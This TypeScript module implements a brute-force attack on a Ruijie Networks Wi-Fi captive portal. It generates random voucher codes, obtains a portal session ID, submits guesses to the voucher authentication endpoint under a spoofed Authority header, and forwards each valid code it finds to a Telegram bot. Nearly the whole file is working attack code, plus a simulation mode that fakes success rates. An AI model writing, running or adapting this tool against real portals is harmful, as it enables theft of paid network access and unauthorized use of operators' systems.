
import { Config, SessionSlot } from '../types';

// Helper to generate random code based on config
export const generateAccessCode = (config: Config): string => {
  let charset = '';
  if (config.useNumbers) charset += '0123456789';
  if (config.useLowercase) charset += 'abcdefghijklmnopqrstuvwxyz';
  if (config.useUppercase) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';

  // Fallback if nothing selected
  if (charset.length === 0) charset = '0123456789';

  let result = config.codePrefix || '';
  // Ensure we don't exceed length if prefix is long, but try to fill remaining
  const remainingLength = Math.max(0, config.codeLength - result.length);

  for (let i = 0; i < remainingLength; i++) {
    const randomIndex = Math.floor(Math.random() * charset.length);
    result += charset[randomIndex];
  }

  return result;
};

// Simulate network delay
const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

// Mock Session ID Fetcher
export const fetchSessionId = async (config: Config): Promise<string | null> => {
  if (config.simulationMode) {
    await delay(500);
    return 'sess_' + Math.random().toString(36).substring(7);
  }

  try {
    // Real implementation (likely to fail in browser due to CORS without a proxy)
    // This replicates the Python script's fetch logic
    const response = await fetch(`${config.targetUrl}/api/auth/wifidog?stage=portal`, {
      method: 'GET',
      redirect: 'follow', // In browser, we rely on browser handling redirects usually
    });
    
    // In a real browser scenario, we might not get the headers due to CORS.
    // This is best effort or requires a proxy.
    const url = new URL(response.url);
    return url.searchParams.get('sessionId');
  } catch (error) {
    console.error("Session fetch error:", error);
    return null;
  }
};

// Check Code Logic
export const checkCode = async (
  code: string, 
  sessionId: string, 
  config: Config
): Promise<{ valid: boolean; status: number; message: string }> => {
  
  if (config.simulationMode) {
    // 0.5% chance of finding a code in simulation
    const isSuccess = Math.random() < 0.005; 
    await delay(100 + Math.random() * 200); // Jitter
    
    if (isSuccess) {
        return { valid: true, status: 200, message: 'true' };
    }
    // 1% chance of session timeout
    if (Math.random() < 0.01) {
        return { valid: false, status: 401, message: 'session timed out' };
    }
    return { valid: false, status: 200, message: 'false' };
  }

  // Real Request logic
  try {
    const response = await fetch(`${config.targetUrl}/api/auth/voucher/?lang=en_US`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authority': 'portal-as.ruijienetworks.com',
      },
      body: JSON.stringify({
        accessCode: code,
        sessionId: sessionId,
        apiVersion: 1
      })
    });

    const text = await response.text();
    const valid = text.toLowerCase().includes('true');
    
    return {
      valid,
      status: response.status,
      message: text
    };
  } catch (error) {
    return { valid: false, status: 0, message: String(error) };
  }
};

// Telegram Sender
export const sendTelegramAlert = async (
  code: string, 
  sessionId: string, 
  config: Config
) => {
  if (!config.telegramBotToken || !config.telegramChatId) return;

  const msg = `✅ VALID CODE FOUND: ${code}\nSession: ${sessionId}`;
  const url = `https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`;
  
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: config.telegramChatId,
        text: msg,
        parse_mode: 'HTML'
      })
    });
  } catch (e) {
    console.error("Telegram send failed", e);
  }
};
